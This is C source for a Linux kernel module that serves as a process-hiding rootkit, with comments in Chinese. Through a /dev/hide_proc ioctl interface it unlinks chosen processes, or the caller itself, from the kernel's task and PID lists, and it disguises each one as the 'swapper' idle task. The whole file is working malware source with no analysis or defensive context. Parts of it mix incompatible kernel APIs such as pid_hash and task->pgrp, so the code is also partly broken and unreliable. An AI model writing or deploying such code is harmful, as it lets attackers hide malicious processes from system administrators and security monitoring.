#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/cdev.h>
#include <linux/device.h>
#include <linux/uaccess.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/sched/signal.h>
#include <linux/slab.h>

#define DEVICE_NAME "hide_proc"
#define CLASS_NAME "hide_proc"
#define DEVICE_PATH "/dev/hide_proc"

static dev_t dev_num;
static struct cdev hide_proc_cdev;
static struct class *hide_proc_class = NULL;
static struct device *hide_proc_device = NULL;

static LIST_HEAD(hidden_processes);

struct hidden_proc {
    pid_t pid;
    struct task_struct *task;
    struct list_head list;
};

// IOCTL命令定义
#define HIDE_PROC_MAGIC 'h'
#define HIDE_PROC_IOCTL_HIDE _IOW(HIDE_PROC_MAGIC, 1, int)
#define HIDE_PROC_IOCTL_UNHIDE _IOW(HIDE_PROC_MAGIC, 2, int)
#define HIDE_PROC_IOCTL_HIDE_SELF _IO(HIDE_PROC_MAGIC, 3)
#define HIDE_PROC_IOCTL_UNHIDE_SELF _IO(HIDE_PROC_MAGIC, 4)

static void hide_task(struct task_struct *task) {
    if (!task) return;
    
    // 从各种链表中移除
    list_del_rcu(&task->tasks);
    hlist_del_rcu(&task->pid_links[PIDTYPE_PID]);
    hlist_del_rcu(&task->pid_links[PIDTYPE_TGID]);
    hlist_del_rcu(&task->pid_links[PIDTYPE_PGID]);
    hlist_del_rcu(&task->pid_links[PIDTYPE_SID]);
    
    // 伪装成空闲进程
    memcpy(task->comm, "swapper", 8);
    task->flags |= PF_IDLE;
}

static void unhide_task(struct task_struct *task) {
    if (!task) return;
    
    // 重新添加到各种链表
    list_add_tail_rcu(&task->tasks, &init_task.tasks);
    hlist_add_head_rcu(&task->pid_links[PIDTYPE_PID], &pid_hash[pid_hashfn(task->pid)]);
    hlist_add_head_rcu(&task->pid_links[PIDTYPE_TGID], &pid_hash[pid_hashfn(task->tgid)]);
    hlist_add_head_rcu(&task->pid_links[PIDTYPE_PGID], &pid_hash[pid_hashfn(task->pgrp)]);
    hlist_add_head_rcu(&task->pid_links[PIDTYPE_SID], &pid_hash[pid_hashfn(task->session)]);
}

static long hide_proc_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    pid_t pid;
    struct task_struct *task;
    struct hidden_proc *hp, *tmp;
    
    switch (cmd) {
    case HIDE_PROC_IOCTL_HIDE:
        if (copy_from_user(&pid, (void __user *)arg, sizeof(pid)))
            return -EFAULT;
        
        task = pid_task(find_vpid(pid), PIDTYPE_PID);
        if (!task) return -ESRCH;
        
        hp = kmalloc(sizeof(struct hidden_proc), GFP_KERNEL);
        if (!hp) return -ENOMEM;
        
        hp->pid = pid;
        hp->task = task;
        INIT_LIST_HEAD(&hp->list);
        list_add_tail(&hp->list, &hidden_processes);
        
        hide_task(task);
        break;
        
    case HIDE_PROC_IOCTL_UNHIDE:
        if (copy_from_user(&pid, (void __user *)arg, sizeof(pid)))
            return -EFAULT;
        
        list_for_each_entry_safe(hp, tmp, &hidden_processes, list) {
            if (hp->pid == pid) {
                unhide_task(hp->task);
                list_del(&hp->list);
                kfree(hp);
                break;
            }
        }
        break;
        
    case HIDE_PROC_IOCTL_HIDE_SELF:
        hp = kmalloc(sizeof(struct hidden_proc), GFP_KERNEL);
        if (!hp) return -ENOMEM;
        
        hp->pid = current->pid;
        hp->task = current;
        INIT_LIST_HEAD(&hp->list);
        list_add_tail(&hp->list, &hidden_processes);
        
        hide_task(current);
        break;
        
    case HIDE_PROC_IOCTL_UNHIDE_SELF:
        list_for_each_entry_safe(hp, tmp, &hidden_processes, list) {
            if (hp->pid == current->pid) {
                unhide_task(hp->task);
                list_del(&hp->list);
                kfree(hp);
                break;
            }
        }
        break;
        
    default:
        return -ENOTTY;
    }
    
    return 0;
}

static int hide_proc_open(struct inode *inode, struct file *file) {
    return 0;
}

static int hide_proc_release(struct inode *inode, struct file *file) {
    return 0;
}

static struct file_operations hide_proc_fops = {
    .owner = THIS_MODULE,
    .open = hide_proc_open,
    .release = hide_proc_release,
    .unlocked_ioctl = hide_proc_ioctl,
};

static int __init hide_proc_init(void) {
    int ret;
    
    // 分配设备号
    ret = alloc_chrdev_region(&dev_num, 0, 1, DEVICE_NAME);
    if (ret < 0) {
        printk(KERN_ERR "Failed to allocate device number\n");
        return ret;
    }
    
    // 初始化字符设备
    cdev_init(&hide_proc_cdev, &hide_proc_fops);
    hide_proc_cdev.owner = THIS_MODULE;
    
    // 添加字符设备
    ret = cdev_add(&hide_proc_cdev, dev_num, 1);
    if (ret < 0) {
        printk(KERN_ERR "Failed to add character device\n");
        unregister_chrdev_region(dev_num, 1);
        return ret;
    }
    
    // 创建设备类
    hide_proc_class = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(hide_proc_class)) {
        printk(KERN_ERR "Failed to create device class\n");
        cdev_del(&hide_proc_cdev);
        unregister_chrdev_region(dev_num, 1);
        return PTR_ERR(hide_proc_class);
    }
    
    // 创建设备节点
    hide_proc_device = device_create(hide_proc_class, NULL, dev_num, NULL, DEVICE_NAME);
    if (IS_ERR(hide_proc_device)) {
        printk(KERN_ERR "Failed to create device\n");
        class_destroy(hide_proc_class);
        cdev_del(&hide_proc_cdev);
        unregister_chrdev_region(dev_num, 1);
        return PTR_ERR(hide_proc_device);
    }
    
    printk(KERN_INFO "Hide process module loaded\n");
    return 0;
}

static void __exit hide_proc_exit(void) {
    struct hidden_proc *hp, *tmp;
    
    // 恢复所有隐藏的进程
    list_for_each_entry_safe(hp, tmp, &hidden_processes, list) {
        unhide_task(hp->task);
        list_del(&hp->list);
        kfree(hp);
    }
    
    // 清理设备
    device_destroy(hide_proc_class, dev_num);
    class_destroy(hide_proc_class);
    cdev_del(&hide_proc_cdev);
    unregister_chrdev_region(dev_num, 1);
    
    printk(KERN_INFO "Hide process module unloaded\n");
}

module_init(hide_proc_init);
module_exit(hide_proc_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Your Name");
MODULE_DESCRIPTION("Advanced process hiding module");
